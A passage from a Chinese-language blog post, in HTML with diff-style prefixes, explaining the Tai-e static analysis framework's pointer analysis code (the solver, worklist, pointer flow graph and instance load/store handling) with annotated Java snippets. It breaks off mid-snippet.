+<h2 id="4-2-PointerAnalysis"><a href="#4-2-PointerAnalysis" class="headerlink" title="4.2 PointerAnalysis"></a>4.2 PointerAnalysis</h2><p>实际上PointerAnalysis 也只是一层包装，具体逻辑是在solver和plugin中实现的。</p>
+<p>这里有几个变量涉及到前文中几个重要的概念</p>
+<p>heapModel：堆模型，负责指针分析中的“值”处理，用以区分它们的上下文<br>selector：上下文选择器，用于区分“变量”的上下文<br>这两个都后续再深入研究探讨，这里简单介绍下它们的功能，了解接口即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PointerAnalysisResult <span class="title function_">analyze</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">AnalysisOptions</span> <span class="variable">options</span> <span class="operator">=</span> getOptions();</span><br><span class="line">    <span class="comment">// 根据配置，生成heapModel 堆模型</span></span><br><span class="line">    <span class="type">HeapModel</span> <span class="variable">heapModel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AllocationSiteBasedModel</span>(options);</span><br><span class="line">    <span class="type">ContextSelector</span> <span class="variable">selector</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">advanced</span> <span class="operator">=</span> options.getString(<span class="string">&quot;advanced&quot;</span>);</span><br><span class="line">    <span class="comment">// 根据配置中的cs字段，生成上下文管理器</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cs</span> <span class="operator">=</span> options.getString(<span class="string">&quot;cs&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (advanced != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (advanced.equals(<span class="string">&quot;collection&quot;</span>)) &#123;</span><br><span class="line">            selector = ContextSelectorFactory.makeSelectiveSelector(cs,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">CollectionMethods</span>(World.get().getClassHierarchy()).get());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// run context-insensitive analysis as pre-analysis</span></span><br><span class="line">            <span class="type">PointerAnalysisResult</span> <span class="variable">preResult</span> <span class="operator">=</span> runAnalysis(heapModel,</span><br><span class="line">                    ContextSelectorFactory.makeCISelector());</span><br><span class="line">            <span class="keyword">if</span> (advanced.startsWith(<span class="string">&quot;scaler&quot;</span>)) &#123;</span><br><span class="line">                selector = Timer.runAndCount(() -&gt; ContextSelectorFactory</span><br><span class="line">                                .makeGuidedSelector(Scaler.run(preResult, advanced)),</span><br><span class="line">                        <span class="string">&quot;Scaler&quot;</span>, Level.INFO);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (advanced.startsWith(<span class="string">&quot;zipper&quot;</span>)) &#123;</span><br><span class="line">                selector = Timer.runAndCount(() -&gt; ContextSelectorFactory</span><br><span class="line">                                .makeSelectiveSelector(cs, Zipper.run(preResult, advanced)),</span><br><span class="line">                        <span class="string">&quot;Zipper&quot;</span>, Level.INFO);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (advanced.equals(<span class="string">&quot;mahjong&quot;</span>)) &#123;</span><br><span class="line">                heapModel = Timer.runAndCount(() -&gt; Mahjong.run(preResult, options),</span><br><span class="line">                        <span class="string">&quot;Mahjong&quot;</span>, Level.INFO);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                        <span class="string">&quot;Illegal advanced analysis argument: &quot;</span> + advanced);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (selector == <span class="literal">null</span>) &#123;</span><br><span class="line">        selector = ContextSelectorFactory.makePlainSelector(cs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> runAnalysis(heapModel, selector);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-3-DefaultSolver"><a href="#4-3-DefaultSolver" class="headerlink" title="4.3 DefaultSolver"></a>4.3 DefaultSolver</h2><p>PointerAnalysis.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> PointerAnalysisResult <span class="title function_">runAnalysis</span><span class="params">(HeapModel heapModel,</span></span><br><span class="line"><span class="params">                                          ContextSelector selector)</span> &#123;</span><br><span class="line">    <span class="type">AnalysisOptions</span> <span class="variable">options</span> <span class="operator">=</span> getOptions();</span><br><span class="line">    <span class="type">Solver</span> <span class="variable">solver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSolver</span>(options,</span><br><span class="line">            heapModel, selector, <span class="keyword">new</span> <span class="title class_">MapBasedCSManager</span>());</span><br><span class="line">    <span class="comment">// The initialization of some Plugins may read the fields in solver,</span></span><br><span class="line">    <span class="comment">// e.g., contextSelector or csManager, thus we initialize Plugins</span></span><br><span class="line">    <span class="comment">// after setting all other fields of solver.</span></span><br><span class="line">    setPlugin(solver, options);</span><br><span class="line">    solver.solve();</span><br><span class="line">    <span class="keyword">return</span> solver.getResult();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-1-Fields"><a href="#4-3-1-Fields" class="headerlink" title="4.3.1 Fields"></a>4.3.1 Fields</h3><ul>
+<li>propTypes</li>
+<li>workList: 前文提到的WorkList结构，是整个指针分析的重点</li>
+<li>options: 用户配置</li>
+<li>heapModel: 堆模型</li>
+<li>contextSelector: 上下文选择器</li>
+<li>csManager: 上下文管理的，整个指针分析的结果</li>
+<li>ptrManager: 指向关系</li>
+<li>objManager: obj</li>
+<li>mtdManager: method</li>
+<li>callSites: call</li>
+<li>hierarchy: 从World获取的类继承关系hierarchy = World.get().getClassHierarchy();</li>
+<li>typeSystem: 从World获取的类型系统typeSystem = World.get().getTypeSystem();</li>
+<li>ptsFactory</li>
+<li>callGraph</li>
+<li>pointerFlowGraph: 最终的PFG，其实最终还是放在csManager。</li>
+</ul>
+<h4 id="caManager只见get不见add-set"><a href="#caManager只见get不见add-set" class="headerlink" title="caManager只见get不见add/set"></a>caManager只见get不见add/set</h4><p>csManager中的几个feild是如何add值的？</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> CSVar <span class="title function_">getCSVar</span><span class="params">(Context context, Var <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> vars.computeIfAbsent(<span class="keyword">var</span>, context,</span><br><span class="line">            (v, c) -&gt; <span class="keyword">new</span> <span class="title class_">CSVar</span>(v, c, counter++));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>答案是用了computeIfAbsent，不存在则添加。</p>
+<p>其他一些类似结构也都是如此处理的。</p>
+<h3 id="4-3-2-API"><a href="#4-3-2-API" class="headerlink" title="4.3.2 API"></a>4.3.2 API</h3><h4 id="workList相关"><a href="#workList相关" class="headerlink" title="workList相关"></a>workList相关</h4><p>其实前文也提到了两个关于workList的API</p>
+<ul>
+<li><p>addPointsTo(Pointer pointer, PointsToSet pts)：增加待处理的指向关系</p>
+</li>
+<li><p>addCallEdge(Edge&lt;CSCallSite, CSMethod&gt; edge)：增加待处理的call调用关系<br>还有一些派生的添加WorkList的API</p>
+</li>
+<li><p>addPointsTo(Pointer pointer, Context heapContext, Obj obj)</p>
+</li>
+<li><p>addVarPointsTo(Context context, Var var, PointsToSet pts)</p>
+</li>
+<li><p>addVarPointsTo(Context context, Var var, CSObj csObj)</p>
+</li>
+<li><p>addVarPointsTo(Context context, Var var, Context heapContext, Obj obj)<br>其最终都是调用的addPointsTo(Pointer pointer, PointsToSet pts)向workList 中增加pointerEntry。</p>
+</li>
+</ul>
+<p>除此还有一些重点的API，一一讲解下</p>
+<h4 id="addEntryPoint-EntryPoint-entryPoint"><a href="#addEntryPoint-EntryPoint-entryPoint" class="headerlink" title="addEntryPoint(EntryPoint entryPoint)"></a>addEntryPoint(EntryPoint entryPoint)</h4><p>EntryPoint是入口函数，一般是Main方法，Tai-e内置了一些隐式入口，比如Thread#run等，具体逻辑在EntryPointHandler plugin插件中。</p>
+<p>addEntryPoint提供了统一的分析入口API，指针分析从此开始。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEntryPoint</span><span class="params">(EntryPoint entryPoint)</span> &#123;</span><br><span class="line">	<span class="comment">// 空上下文</span></span><br><span class="line">    <span class="type">Context</span> <span class="variable">entryCtx</span> <span class="operator">=</span> contextSelector.getEmptyContext();</span><br><span class="line">    <span class="comment">// 入口函数，IR格式</span></span><br><span class="line">    <span class="type">JMethod</span> <span class="variable">entryMethod</span> <span class="operator">=</span> entryPoint.getMethod();</span><br><span class="line">    <span class="comment">// 组合成上下文方法</span></span><br><span class="line">    <span class="type">CSMethod</span> <span class="variable">csEntryMethod</span> <span class="operator">=</span> csManager.getCSMethod(entryCtx, entryMethod);</span><br><span class="line">    <span class="comment">// callGraph 添加</span></span><br><span class="line">    callGraph.addEntryMethod(csEntryMethod);</span><br><span class="line">    <span class="comment">// 触发所有插件的新增CSMethod逻辑，具体逻辑看插件的处理</span></span><br><span class="line">    <span class="comment">// 注意这里会触发StmtProcessor，后文再讲</span></span><br><span class="line">    addCSMethod(csEntryMethod);</span><br><span class="line">    <span class="comment">// 获取IR</span></span><br><span class="line">    <span class="type">IR</span> <span class="variable">ir</span> <span class="operator">=</span> entryMethod.getIR();</span><br><span class="line">    <span class="comment">// pass this objects</span></span><br><span class="line">    <span class="keyword">if</span> (!entryMethod.isStatic()) &#123;</span><br><span class="line">    	<span class="comment">// 针对目前的entryPoint，获取this obj</span></span><br><span class="line">        <span class="keyword">for</span> (Obj thisObj : entryPoint.getThisObjs()) &#123;</span><br><span class="line">        	<span class="comment">// 在workList中添加一条待处理的pointEntry</span></span><br><span class="line">            <span class="comment">// 其中Var为entryCtx和ir组合</span></span><br><span class="line">            <span class="comment">// Obj为entryCtx和this obj</span></span><br><span class="line">            addVarPointsTo(entryCtx, ir.getThis(), entryCtx, thisObj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理参数</span></span><br><span class="line">    <span class="comment">// pass parameter objects</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; entryMethod.getParamCount(); ++i) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">param</span> <span class="operator">=</span> ir.getParam(i);</span><br><span class="line">        <span class="comment">// 判断是否是是配置的IR类型，比如</span></span><br><span class="line">        <span class="comment">// null，默认false</span></span><br><span class="line">        <span class="comment">// reference（ArrayType/ClassType），默认true</span></span><br><span class="line">        <span class="comment">// 内置primitiveType白名单</span></span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(param)) &#123;</span><br><span class="line">        	<span class="comment">// 每一个参数param及paramObj，放入WorkList队列中</span></span><br><span class="line">            <span class="keyword">for</span> (Obj paramObj : entryPoint.getParamObjs(i)) &#123;</span><br><span class="line">                addVarPointsTo(entryCtx, param, entryCtx, paramObj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>疑问：以上只见到了this、param 添加到workList，里面的各个IR呢？后文StmtProcessor详细解读</p>
+</blockquote>
+<h4 id="propagate-Pointer-pointer-PointsToSet-pointsToSet"><a href="#propagate-Pointer-pointer-PointsToSet-pointsToSet" class="headerlink" title="propagate(Pointer pointer, PointsToSet pointsToSet)"></a>propagate(Pointer pointer, PointsToSet pointsToSet)</h4><p>功能：目的是将Pointer内原有的pointsToSet和新的pointsToSet整合。</p>
+<p>先看参数Pointer，他是个接口，有以下的一些实现：</p>
+<ul>
+<li>AbstractPointer</li>
+<li>CSVar</li>
+<li>ArrayIndex</li>
+<li>InstanceField</li>
+<li>StaticField<br>其中AbstractPointer是抽象实现，其他是个是指针分析最终要求解的结果中的“Variable/Field”<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> PointsToSet <span class="title function_">propagate</span><span class="params">(Pointer pointer, PointsToSet pointsToSet)</span> &#123;</span><br><span class="line">    logger.trace(<span class="string">&quot;Propagate &#123;&#125; to &#123;&#125;&quot;</span>, pointsToSet, pointer);</span><br><span class="line">    <span class="comment">// 先取出原pointer的filter</span></span><br><span class="line">    Set&lt;Predicate&lt;CSObj&gt;&gt; filters = pointer.getFilters();</span><br><span class="line">    <span class="keyword">if</span> (!filters.isEmpty()) &#123;</span><br><span class="line">    	<span class="comment">// 待处理的pointsToSet先过一遍filter，组合成新的pointsToSet</span></span><br><span class="line">        <span class="comment">// apply filters (of the pointer) on pointsToSet</span></span><br><span class="line">        pointsToSet = pointsToSet.objects()</span><br><span class="line">                .filter(o -&gt; filters.stream().allMatch(f -&gt; f.test(o)))</span><br><span class="line">                .collect(ptsFactory::make, PointsToSet::addObject, PointsToSet::addAll);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 原pointer的pointsToSet添加上所有新的符合filter的pointsToSet</span></span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">diff</span> <span class="operator">=</span> getPointsToSetOf(pointer).addAllDiff(pointsToSet);</span><br><span class="line">    <span class="comment">// TODO：待添加分析</span></span><br><span class="line">    <span class="keyword">if</span> (!diff.isEmpty()) &#123;</span><br><span class="line">        pointerFlowGraph.getOutEdgesOf(pointer).forEach(edge -&gt; &#123;</span><br><span class="line">            <span class="type">Pointer</span> <span class="variable">target</span> <span class="operator">=</span> edge.target();</span><br><span class="line">            edge.getTransfers().forEach(transfer -&gt;</span><br><span class="line">                    addPointsTo(target, transfer.apply(edge, diff)));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> diff;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>TODO: 边的处理待解释，猜测如果是有指向关系，那么把也要把新的pts合并过去。</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h4><p>analyze是整个Solver的核心逻辑，围绕workList，从中取值并处理，直至为空，整个指针分析过程完毕。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">analyze</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (!workList.isEmpty() &amp;&amp; !isTimeout) &#123;</span><br><span class="line">        WorkList.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> workList.pollEntry();</span><br><span class="line">        <span class="keyword">if</span> (entry <span class="keyword">instanceof</span> WorkList.PointerEntry pEntry) &#123;</span><br><span class="line">            <span class="type">Pointer</span> <span class="variable">p</span> <span class="operator">=</span> pEntry.pointer();</span><br><span class="line">            <span class="type">PointsToSet</span> <span class="variable">pts</span> <span class="operator">=</span> pEntry.pointsToSet();</span><br><span class="line">            <span class="type">PointsToSet</span> <span class="variable">diff</span> <span class="operator">=</span> propagate(p, pts);</span><br><span class="line">            <span class="keyword">if</span> (!diff.isEmpty() &amp;&amp; p <span class="keyword">instanceof</span> CSVar v) &#123;</span><br><span class="line">            	<span class="comment">// 处理InstanceStore</span></span><br><span class="line">                processInstanceStore(v, diff);</span><br><span class="line">                processInstanceLoad(v, diff);</span><br><span class="line">                processArrayStore(v, diff);</span><br><span class="line">                processArrayLoad(v, diff);</span><br><span class="line">                processCall(v, diff);</span><br><span class="line">                plugin.onNewPointsToSet(v, diff);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (entry <span class="keyword">instanceof</span> WorkList.CallEdgeEntry eEntry) &#123;</span><br><span class="line">            processCallEdge(eEntry.edge());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!workList.isEmpty() &amp;&amp; isTimeout) &#123;</span><br><span class="line">        logger.warn(<span class="string">&quot;Pointer analysis stops early as it reaches time limit (&#123;&#125; seconds),&quot;</span> +</span><br><span class="line">                <span class="string">&quot; and the result may be unsound!&quot;</span>, timeLimit);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (timeLimiter != <span class="literal">null</span>) &#123; <span class="comment">// finish normally but time limiter is still running</span></span><br><span class="line">        timeLimiter.stop();</span><br><span class="line">    &#125;</span><br><span class="line">    plugin.onFinish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中有涉及到几种类型的处理</p>
+<ul>
+<li>PointerEntry</li>
+<li>InstanceStore</li>
+<li>InstanceLoad</li>
+<li>ArrayStore</li>
+<li>ArrayLoad</li>
+<li>Call</li>
+<li>CallEdgeEntry</li>
+<li>CallEdge</li>
+</ul>
+<h4 id="processInstanceStore-CSVar-baseVar-PointsToSet-pts"><a href="#processInstanceStore-CSVar-baseVar-PointsToSet-pts" class="headerlink" title="processInstanceStore(CSVar baseVar, PointsToSet pts)"></a>processInstanceStore(CSVar baseVar, PointsToSet pts)</h4><p>疑问：是指的课件中的存储吗？</p>
+<p><img src="/images/pasted-777.png" alt="upload successful"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processInstanceStore</span><span class="params">(CSVar baseVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> baseVar.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> baseVar.getVar();</span><br><span class="line">    <span class="comment">// 获取Var中的StoreField，参考前文Var结构一节</span></span><br><span class="line">    <span class="keyword">for</span> (StoreField store : <span class="keyword">var</span>.getStoreFields()) &#123;</span><br><span class="line">    	<span class="comment">// 右侧的Var</span></span><br><span class="line">        <span class="type">Var</span> <span class="variable">fromVar</span> <span class="operator">=</span> store.getRValue();</span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(fromVar)) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">from</span> <span class="operator">=</span> csManager.getCSVar(context, fromVar);</span><br><span class="line">            <span class="comment">// 获取filed</span></span><br><span class="line">            <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> store.getFieldRef().resolve();</span><br><span class="line">            <span class="comment">// pts每一个Obj</span></span><br><span class="line">            pts.forEach(baseObj -&gt; &#123;</span><br><span class="line">            	<span class="comment">// </span></span><br><span class="line">                <span class="keyword">if</span> (baseObj.getObject().isFunctional()) &#123;</span><br><span class="line">                	<span class="comment">// 获取其对应的field</span></span><br><span class="line">                    <span class="type">InstanceField</span> <span class="variable">instField</span> <span class="operator">=</span> csManager.getInstanceField(baseObj, field);</span><br><span class="line">                    <span class="comment">// 如课件图，在最终的PFG图中，增加一条oi-&gt;oj的边</span></span><br><span class="line">                    addPFGEdge(from, instField, FlowKind.INSTANCE_STORE);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>疑问：途中是oi-&gt;oj，这里实际是Pointer-&gt;Pointer(CSVar-&gt;InstanceField)。</p>
+</blockquote>
+<p>顺带看看addPFGEdge(Pointer source, Pointer target, FlowKind kind,Transfer transfer)</p>
+<h4 id="addPFGEdge-Pointer-source-Pointer-target-FlowKind-kind-Transfer-transfer"><a href="#addPFGEdge-Pointer-source-Pointer-target-FlowKind-kind-Transfer-transfer" class="headerlink" title="addPFGEdge(Pointer source, Pointer target, FlowKind kind,Transfer transfer)"></a>addPFGEdge(Pointer source, Pointer target, FlowKind kind,Transfer transfer)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addPFGEdge</span><span class="params">(Pointer source, Pointer target, FlowKind kind,</span></span><br><span class="line"><span class="params">                       Transfer transfer)</span> &#123;</span><br><span class="line">    <span class="comment">// source的边Edge添加一条边</span></span><br><span class="line">    <span class="type">PointerFlowEdge</span> <span class="variable">edge</span> <span class="operator">=</span> pointerFlowGraph.getOrAddEdge(kind, source, target);</span><br><span class="line">    <span class="keyword">if</span> (edge != <span class="literal">null</span> &amp;&amp; edge.addTransfer(transfer)) &#123;</span><br><span class="line">    	<span class="comment">// 获取source原本的pts</span></span><br><span class="line">        <span class="type">PointsToSet</span> <span class="variable">targetSet</span> <span class="operator">=</span> transfer.apply(edge, getPointsToSetOf(source));</span><br><span class="line">        <span class="keyword">if</span> (!targetSet.isEmpty()) &#123;</span><br><span class="line">        	<span class="comment">// 添加到workList中</span></span><br><span class="line">            addPointsTo(target, targetSet);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意：可以看出，addPFGEdge不只是增加一条边，还有把原来的source pts整合进target中，不需要再单独的addPointsTo。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PointerFlowEdge <span class="title function_">getOrAddEdge</span><span class="params">(FlowKind kind, Pointer source, Pointer target)</span> &#123;</span><br><span class="line">	<span class="comment">// Var中添加一条边</span></span><br><span class="line">    <span class="keyword">return</span> source.getOrAddEdge(kind, source, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>AbstractPointer.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PointerFlowEdge <span class="title function_">getOrAddEdge</span><span class="params">(FlowKind kind, Pointer source, Pointer target)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (successors.add(target)) &#123;</span><br><span class="line">        <span class="type">PointerFlowEdge</span> <span class="variable">edge</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PointerFlowEdge</span>(kind, source, target);</span><br><span class="line">        outEdges.add(edge);</span><br><span class="line">        <span class="keyword">return</span> edge;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (kind == FlowKind.OTHER) &#123;</span><br><span class="line">        <span class="keyword">for</span> (PointerFlowEdge edge : outEdges) &#123;</span><br><span class="line">            <span class="keyword">if</span> (edge.target().equals(target)) &#123;</span><br><span class="line">                <span class="keyword">return</span> edge;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>successors 添加target</li>
+<li>outEdges 添加一条到target的边</li>
+</ul>
+<h4 id="processInstanceLoad-CSVar-baseVar-PointsToSet-pts"><a href="#processInstanceLoad-CSVar-baseVar-PointsToSet-pts" class="headerlink" title="processInstanceLoad(CSVar baseVar, PointsToSet pts)"></a>processInstanceLoad(CSVar baseVar, PointsToSet pts)</h4><p><img src="/images/pasted-778.png" alt="upload successful"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processInstanceLoad</span><span class="params">(CSVar baseVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> baseVar.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> baseVar.getVar();</span><br><span class="line">    <span class="keyword">for</span> (LoadField load : <span class="keyword">var</span>.getLoadFields()) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">toVar</span> <span class="operator">=</span> load.getLValue();</span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(toVar)) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">to</span> <span class="operator">=</span> csManager.getCSVar(context, toVar);</span><br><span class="line">            <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> load.getFieldRef().resolve();</span><br><span class="line">            pts.forEach(baseObj -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (baseObj.getObject().isFunctional()) &#123;</span><br><span class="line">                    <span class="type">InstanceField</span> <span class="variable">instField</span> <span class="operator">=</span> csManager.getInstanceField(baseObj, field);</span><br><span class="line">                    addPFGEdge(instField, to, FlowKind.INSTANCE_LOAD);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 